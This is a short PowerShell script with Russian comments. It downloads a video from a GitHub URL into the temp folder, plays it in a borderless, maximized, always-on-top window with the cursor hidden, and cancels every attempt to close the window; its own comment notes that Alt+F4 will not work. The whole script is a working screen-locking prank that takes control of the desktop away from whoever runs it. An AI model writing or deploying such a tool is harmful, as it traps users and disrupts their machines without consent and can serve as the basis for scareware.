# Блок загрузки необходимых библиотек Windows для графики
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# Ссылки и пути
$url = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/assets/0224(2).wmv'
$file = "$env:TEMP\video_payload.wmv"

# Скачиваем видео, если его еще нет
if (-not (Test-Path $file)) {
    Invoke-WebRequest -Uri $url -OutFile $file
}

# XAML разметка окна (максимально "чистая")
[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" 
        WindowState="Maximized" 
        Topmost="True" 
        Background="Black" 
        Cursor="None">
    <Grid>
        <MediaElement Name="vid" 
                      Source="$file" 
                      LoadedBehavior="Play" 
                      UnloadedBehavior="Stop" 
                      Stretch="Uniform"/>
    </Grid>
</Window>
"@

# Загрузка окна
$reader = New-Object System.Xml.XmlNodeReader $xaml
$window = [Windows.Markup.XamlReader]::Load($reader)

# Защита от закрытия (Alt+F4 не сработает)
$window.Add_Closing({
    $_.Cancel = $true
})

# Запуск
$window.ShowDialog() | Out-Null
